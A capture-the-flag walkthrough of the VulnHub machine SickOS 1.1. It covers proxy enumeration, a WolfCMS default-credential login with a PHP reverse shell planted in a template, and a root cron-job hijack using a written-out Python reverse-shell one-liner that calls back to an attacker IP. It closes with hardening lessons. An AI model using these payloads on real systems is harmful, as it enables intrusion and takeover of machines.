# SickOS: Walkthrough

## Overview
**Machine Name**: SickOS 1.1<br>
**Platform**: VulnHub<br>
**Difficulty**: Medium<br>
**OS**: Linux (Ubuntu)<br>
**Focus**: Squid Proxy Enumeration, WolfCMS Exploit, Python Cronjob Hijack

## Enumeration

### Port Scanning
A full TCP port scan was performed:
```bash
nmap -T4 -A -p- 192.168.29.167
```
Scan results:
| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | ssh | OpenSSH 5.9p1 Debian 5ubuntu1.1 |
| 3128/tcp | http-proxy | Squid http proxy 3.1.19 |

### Proxy Enumeration & Web Discovery
Accessing port `3128` directly returned a Squid proxy error page:
![](screenshots/Pasted%20image%2020260424205538.png)

Using the Squid proxy to route traffic via FoxyProxy allowed browsing the web service:
![](screenshots/Pasted%20image%2020260424211556.png)

Directory fuzzing was performed through the Squid proxy using `ffuf`:
```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.29.167/FUZZ -x http://192.168.29.167:3128
```
Discovered directories:
- `/robots.txt`
- `/connect` (OPTIONS allowed GET, HEAD, POST, OPTIONS)

Checking `robots.txt` pointed to the directory `/wolfcms`.
![](screenshots/Pasted%20image%2020260424220756.png)

## Exploitation
### WolfCMS Shell Upload
Navigating to the `/wolfcms` administration dashboard allowed logging in using default credentials `admin:admin`.

Using the dashboard edit tool, the main homepage template was updated with the Pentestmonkey PHP reverse shell. A Netcat listener was started:
```bash
nc -lvnp 8888
```

Browsing to the modified homepage triggered the reverse shell:
```bash
whoami
www-data
```

## Privilege Escalation
### Local Enumeration
Enumerate scheduled cron jobs:
```bash
cat /etc/crontab
ls -la /etc/cron.d/
```
Inside `/etc/cron.d/`, a script named `automate` was found running every minute:
```
* * * * * root /usr/bin/python /var/www/connect.py
```

### Python Cronjob Hijack
Since `/var/www/connect.py` was writable by the `www-data` user, the python script was overwritten with a python reverse shell script payload:
```bash
echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.29.199",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' > /var/www/connect.py
```

A Netcat listener on port `443` caught the execution:
```bash
nc -lvnp 443
whoami
root
```

## Post-Exploitation
### Flag Recovery
- Root Flag (`/root/a0216ea4d51874464078c618298b1367.txt`):
  ```
  If you are viewing this!!

  ROOT!

  You have Succesfully completed SickOS1.1.
  Thanks for Trying
  ```

## Lessons Learned
1. Configure Squid HTTP proxies to deny access to internal web subdirectories by unauthorized clients.
2. Remove default credentials on WolfCMS or any admin interface.
3. Never permit write permissions for low-privilege users (`www-data`) on scripts that are executed by `root` cronjobs.
